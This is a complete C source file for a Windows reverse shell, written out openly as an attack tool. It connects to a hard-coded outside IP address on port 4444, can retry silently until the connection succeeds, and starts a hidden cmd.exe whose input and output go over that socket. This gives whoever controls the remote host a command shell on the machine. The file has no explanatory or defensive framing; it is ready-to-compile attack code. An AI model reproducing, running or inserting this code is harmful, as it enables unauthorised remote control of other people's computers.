#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"172.104.237.62"
# define CLIENT_PORT (int)4444
#endif
/* ================================================== */

// To compile from CMD: gcc shell.c -o reverseshell -lws2_32
int main(void) {
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		_write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		_write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	inet_pton(AF_INET, CLIENT_IP, &sa.sin_addr.s_addr);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
		_write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
